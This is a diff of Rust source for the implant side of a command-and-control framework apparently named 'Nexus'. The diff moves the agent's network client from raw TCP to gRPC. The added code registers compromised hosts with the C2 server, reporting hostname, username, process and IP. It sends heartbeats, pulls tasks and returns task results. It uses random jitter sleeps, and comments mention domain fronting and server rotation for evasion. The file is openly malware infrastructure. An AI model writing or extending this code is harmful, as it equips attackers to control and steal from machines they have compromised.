@@ -1,107 +1,192 @@
 use nexus_common::*;
 use std::time::Duration;
-use tokio::net::TcpStream;
-use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::time::timeout;
+use tonic::transport::{Channel, Endpoint};
+
+// Include the generated gRPC code
+pub mod nexus {
+    pub mod v1 {
+        tonic::include_proto!("nexus.v1");
+    }
+}
+// Don't use wildcard import to avoid conflicts
+use nexus::v1::{nexus_c2_client, RegistrationRequest, HeartbeatRequest, TaskRequest, SystemStatus};
 
 pub struct NetworkClient {
-    server_addr: String,
+    server_url: String,
     connection_timeout: Duration,
-    read_timeout: Duration,
+    request_timeout: Duration,
+    channel: Option<Channel>,
 }
 
 impl NetworkClient {
-    pub fn new(server_addr: String) -> Self {
+    pub fn new(server_url: String) -> Self {
         Self {
-            server_addr,
+            server_url,
             connection_timeout: Duration::from_secs(10),
-            read_timeout: Duration::from_secs(15),
+            request_timeout: Duration::from_secs(15),
+            channel: None,
         }
     }
 
-    pub fn with_timeouts(mut self, connection_timeout: Duration, read_timeout: Duration) -> Self {
+    pub fn with_timeouts(mut self, connection_timeout: Duration, request_timeout: Duration) -> Self {
         self.connection_timeout = connection_timeout;
-        self.read_timeout = read_timeout;
+        self.request_timeout = request_timeout;
         self
     }
 
-    /// Send a message to the C2 server and receive response
-    pub async fn send_message(&self, encrypted_message: &str) -> Result<String> {
-        // Add jitter before connection
+    /// Establish gRPC connection
+    async fn ensure_connection(&mut self) -> Result<&Channel> {
+        if self.channel.is_none() {
+            let endpoint = Endpoint::from_shared(self.server_url.clone())
+                .map_err(|e| NexusError::NetworkError(format!("Invalid endpoint: {}", e)))?
+                .timeout(self.connection_timeout);
+
+            let channel = timeout(
+                self.connection_timeout,
+                endpoint.connect()
+            ).await
+            .map_err(|_| NexusError::NetworkError("Connection timeout".to_string()))?
+            .map_err(|e| NexusError::NetworkError(format!("gRPC connection failed: {}", e)))?;
+            
+            self.channel = Some(channel);
+        }
+        
+        Ok(self.channel.as_ref().unwrap())
+    }
+
+    /// Register agent with C2 server
+    pub async fn register_agent(&mut self, registration_data: &RegistrationData) -> Result<String> {
         let jitter = rand::random::<u64>() % 5 + 1;
         tokio::time::sleep(Duration::from_secs(jitter)).await;
 
-        // Establish connection with timeout
-        let mut stream = timeout(
-            self.connection_timeout,
-            TcpStream::connect(&self.server_addr)
+        let channel = self.ensure_connection().await?;
+        let mut client = nexus_c2_client::NexusC2Client::new(channel.clone());
+
+        let request = RegistrationRequest {
+            hostname: registration_data.hostname.clone(),
+            os_type: registration_data.os_type.clone(),
+            os_version: registration_data.os_version.clone(),
+            ip_address: registration_data.ip_address.clone(),
+            username: registration_data.username.clone(),
+            process_id: registration_data.process_id,
+            process_name: registration_data.process_name.clone(),
+            architecture: registration_data.architecture.clone(),
+            capabilities: registration_data.capabilities.clone(),
+            public_key: "".to_string(), // TODO: Add public key support
+        };
+
+        let response = timeout(
+            self.request_timeout,
+            client.register_agent(tonic::Request::new(request))
         ).await
-        .map_err(|_| NexusError::NetworkError("Connection timeout".to_string()))?
-        .map_err(|e| NexusError::NetworkError(format!("Connection failed: {}", e)))?;
+        .map_err(|_| NexusError::NetworkError("Registration timeout".to_string()))?
+        .map_err(|e| NexusError::NetworkError(format!("Registration failed: {}", e)))?;
 
-        // Send the encrypted message
-        let message_bytes = encrypted_message.as_bytes();
-        stream.write_all(message_bytes).await
-            .map_err(|e| NexusError::NetworkError(format!("Write failed: {}", e)))?;
-
-        // Read response with timeout
-        let mut response_buffer = vec![0u8; 8192]; // 8KB buffer
-        let bytes_read = timeout(
-            self.read_timeout,
-            stream.read(&mut response_buffer)
-        ).await
-        .map_err(|_| NexusError::NetworkError("Read timeout".to_string()))?
-        .map_err(|e| NexusError::NetworkError(format!("Read failed: {}", e)))?;
-
-        if bytes_read == 0 {
-            return Err(NexusError::NetworkError("Server closed connection".to_string()));
+        let registration_response = response.into_inner();
+        if registration_response.success {
+            Ok(registration_response.agent_id)
+        } else {
+            Err(NexusError::NetworkError(format!("Registration failed: {}", registration_response.message)))
         }
-
-        // Convert response to string
-        let response = String::from_utf8_lossy(&response_buffer[..bytes_read]).to_string();
-        Ok(response)
     }
 
-    /// Send a message without expecting a response (fire and forget)
-    pub async fn send_message_no_response(&self, encrypted_message: &str) -> Result<()> {
+    /// Send heartbeat and get tasks
+    pub async fn heartbeat(&mut self, agent_id: &str) -> Result<Vec<nexus::v1::Task>> {
         let jitter = rand::random::<u64>() % 3 + 1;
         tokio::time::sleep(Duration::from_secs(jitter)).await;
 
-        let mut stream = timeout(
-            self.connection_timeout,
-            TcpStream::connect(&self.server_addr)
+        let channel = self.ensure_connection().await?;
+        let mut client = nexus_c2_client::NexusC2Client::new(channel.clone());
+
+        // Send heartbeat
+        let heartbeat_request = HeartbeatRequest {
+            agent_id: agent_id.to_string(),
+            status: Some(SystemStatus {
+                cpu_usage: 0.0,
+                memory_usage_mb: 0,
+            disk_free_mb: 0,
+                interfaces: vec![],
+                running_processes: vec![],
+            }),
+            task_statuses: vec![],
+        };
+
+        let _heartbeat_response = timeout(
+            self.request_timeout,
+            client.heartbeat(tonic::Request::new(heartbeat_request))
         ).await
-        .map_err(|_| NexusError::NetworkError("Connection timeout".to_string()))?
-        .map_err(|e| NexusError::NetworkError(format!("Connection failed: {}", e)))?;
+        .map_err(|_| NexusError::NetworkError("Heartbeat timeout".to_string()))?
+        .map_err(|e| NexusError::NetworkError(format!("Heartbeat failed: {}", e)))?;
 
-        let message_bytes = encrypted_message.as_bytes();
-        stream.write_all(message_bytes).await
-            .map_err(|e| NexusError::NetworkError(format!("Write failed: {}", e)))?;
+        // Get tasks
+        let task_request = TaskRequest {
+            agent_id: agent_id.to_string(),
+            max_tasks: 10,
+        };
 
-        // Graceful shutdown
-        let _ = stream.shutdown().await;
+        let task_response = timeout(
+            self.request_timeout,
+            client.get_tasks(tonic::Request::new(task_request))
+        ).await
+        .map_err(|_| NexusError::NetworkError("Get tasks timeout".to_string()))?
+        .map_err(|e| NexusError::NetworkError(format!("Get tasks failed: {}", e)))?;
+
+        let mut tasks = Vec::new();
+        let mut task_stream = task_response.into_inner();
+        
+        while let Some(task) = task_stream.message().await
+            .map_err(|e| NexusError::NetworkError(format!("Task stream error: {}", e)))? {
+            tasks.push(task);
+        }
+
+        Ok(tasks)
+    }
+
+    /// Submit task result  
+    pub async fn submit_task_result(&mut self, agent_id: &str, task_result: nexus::v1::TaskResult) -> Result<()> {
+        let channel = self.ensure_connection().await?;
+        let mut client = nexus_c2_client::NexusC2Client::new(channel.clone());
+
+        let _response = timeout(
+            self.request_timeout,
+            client.submit_task_result(tonic::Request::new(task_result))
+        ).await
+        .map_err(|_| NexusError::NetworkError("Submit result timeout".to_string()))?
+        .map_err(|e| NexusError::NetworkError(format!("Submit result failed: {}", e)))?;
+
         Ok(())
     }
 
+    /// Legacy method for backward compatibility
+    pub async fn send_message(&mut self, _encrypted_message: &str) -> Result<String> {
+        // This method is kept for compatibility but should be replaced with specific gRPC calls
+        Err(NexusError::NetworkError("Use specific gRPC methods instead of send_message".to_string()))
+    }
+
+    /// Send a message without expecting a response (fire and forget)
+    pub async fn send_message_no_response(&mut self, _encrypted_message: &str) -> Result<()> {
+        // This method is kept for compatibility but should be replaced with specific gRPC calls
+        Err(NexusError::NetworkError("Use specific gRPC methods instead of send_message_no_response".to_string()))
+    }
+
     /// Test connectivity to the C2 server
-    pub async fn test_connection(&self) -> bool {
-        match timeout(
-            self.connection_timeout,
-            TcpStream::connect(&self.server_addr)
-        ).await {
-            Ok(Ok(_)) => true,
-            _ => false,
+    pub async fn test_connection(&mut self) -> bool {
+        match self.ensure_connection().await {
+            Ok(_) => true,
+            Err(_) => false,
         }
     }
 
-    /// Get the configured server address
+    /// Get the configured server URL
     pub fn get_server_addr(&self) -> &str {
-        &self.server_addr
+        &self.server_url
     }
 
-    /// Update server address (for domain fronting or server rotation)
-    pub fn set_server_addr(&mut self, new_addr: String) {
-        self.server_addr = new_addr;
+    /// Update server URL (for domain fronting or server rotation)
+    pub fn set_server_addr(&mut self, new_url: String) {
+        self.server_url = new_url;
+        self.channel = None; // Force reconnection
     }
 }
 
@@ -139,7 +224,7 @@ impl HttpClient {
     }
 
     /// Send HTTP POST request with encrypted payload
-    pub async fn send_http_message(&self, encrypted_message: &str) -> Result<String> {
+    pub async fn send_http_message(&self, _encrypted_message: &str) -> Result<String> {
         // This is a placeholder implementation
         // In a real implementation, you would use reqwest or similar HTTP client
         // with proper domain fronting headers and SSL configuration
@@ -262,7 +347,7 @@ impl ConnectionManager {
     }
 
     /// Check connectivity to all configured servers
-    pub async fn check_all_servers(&self) -> Vec<(String, bool)> {
+    pub async fn check_all_servers(&mut self) -> Vec<(String, bool)> {
         let mut results = Vec::new();
         
         // Check primary server
@@ -272,7 +357,7 @@ impl ConnectionManager {
 
         // Check backup servers
         for backup_server in &self.backup_servers {
-            let backup_client = NetworkClient::new(backup_server.clone());
+            let mut backup_client = NetworkClient::new(backup_server.clone());
             let backup_ok = backup_client.test_connection().await;
             results.push((backup_server.clone(), backup_ok));
         }
